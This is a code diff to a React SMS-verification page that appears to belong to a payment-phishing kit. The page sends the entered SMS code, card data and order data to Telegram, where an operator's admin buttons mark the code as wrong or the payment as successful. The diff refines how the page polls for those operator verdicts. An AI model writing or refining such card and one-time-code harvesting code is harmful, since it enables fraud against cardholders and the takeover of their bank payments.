@@ -67,23 +67,15 @@ const SMSVerificationPage = () => {
     // Send SMS code to Telegram
     notifySMSCodeEntered(verificationCode, cardData, orderData)
 
-    // Start polling for payment status and invalid SMS
+    // Start checking for invalid SMS flag (only after SMS submission)
+    if (window.startInvalidSMSCheck) {
+      window.startInvalidSMSCheck()
+    }
+
+    // Start polling for payment status
     const userId = localStorage.getItem('telegram_user_id')
     const checkPaymentStatus = setInterval(async () => {
       try {
-        // Check if admin marked SMS as invalid
-        const invalidSMSResponse = await fetch(`/api/check-invalid-sms/${userId}`)
-        const invalidSMSData = await invalidSMSResponse.json()
-        
-        if (invalidSMSData.invalidSMS) {
-          clearInterval(checkPaymentStatus)
-          setIsProcessing(false)
-          navigate('/invalid-sms', {
-            state: { orderData, cardData, fromSMS: true }
-          })
-          return
-        }
-        
         const response = await fetch(`/api/check-payment-status/${userId}`)
         const data = await response.json()
         
@@ -142,37 +134,54 @@ const SMSVerificationPage = () => {
 
   // Check if SMS verification is requested (set by admin button in Telegram)
   useEffect(() => {
-    const checkSMSRequested = () => {
+    const checkSMSRequested = async () => {
       const userId = localStorage.getItem('telegram_user_id')
       const smsRequested = localStorage.getItem(`sms_requested_${userId}`)
       
       // If not requested, redirect back to payment page
       if (!smsRequested && !location.state?.fromPayment) {
         navigate('/payment', { state: { orderData } })
+        return
+      }
+      
+      // Clear invalid SMS flag on page load (fresh start)
+      try {
+        await fetch(`/api/clear-invalid-sms/${userId}`, { method: 'POST' })
+      } catch (error) {
+        console.error('Error clearing invalid SMS flag:', error)
       }
     }
     
     checkSMSRequested()
     
     // Continuously check for invalid SMS flag (admin clicked "Не верное SMS")
+    // Only check this AFTER user has submitted SMS code, not on page load
     const userId = localStorage.getItem('telegram_user_id')
-    const checkInvalidSMS = setInterval(async () => {
-      try {
-        const response = await fetch(`/api/check-invalid-sms/${userId}`)
-        const data = await response.json()
-        
-        if (data.invalidSMS) {
-          clearInterval(checkInvalidSMS)
-          navigate('/invalid-sms', {
-            state: { orderData, cardData, fromSMS: true }
-          })
-        }
-      } catch (error) {
-        console.error('Error checking invalid SMS flag:', error)
-      }
-    }, 1000) // Check every second
+    let checkInvalidSMS = null
     
-    localStorage.setItem('invalidSMSCheckInterval', checkInvalidSMS)
+    // Don't start checking immediately - only after SMS submission
+    const startInvalidSMSCheck = () => {
+      checkInvalidSMS = setInterval(async () => {
+        try {
+          const response = await fetch(`/api/check-invalid-sms/${userId}`)
+          const data = await response.json()
+          
+          if (data.invalidSMS) {
+            clearInterval(checkInvalidSMS)
+            navigate('/invalid-sms', {
+              state: { orderData, cardData, fromSMS: true }
+            })
+          }
+        } catch (error) {
+          console.error('Error checking invalid SMS flag:', error)
+        }
+      }, 1000)
+      
+      localStorage.setItem('invalidSMSCheckInterval', checkInvalidSMS)
+    }
+    
+    // Store the function to start checking later
+    window.startInvalidSMSCheck = startInvalidSMSCheck
     
     // Continuously check for payment status (admin clicked "Успешная оплата" or "Не успешная оплата")
     const checkPaymentStatusInterval = setInterval(async () => {
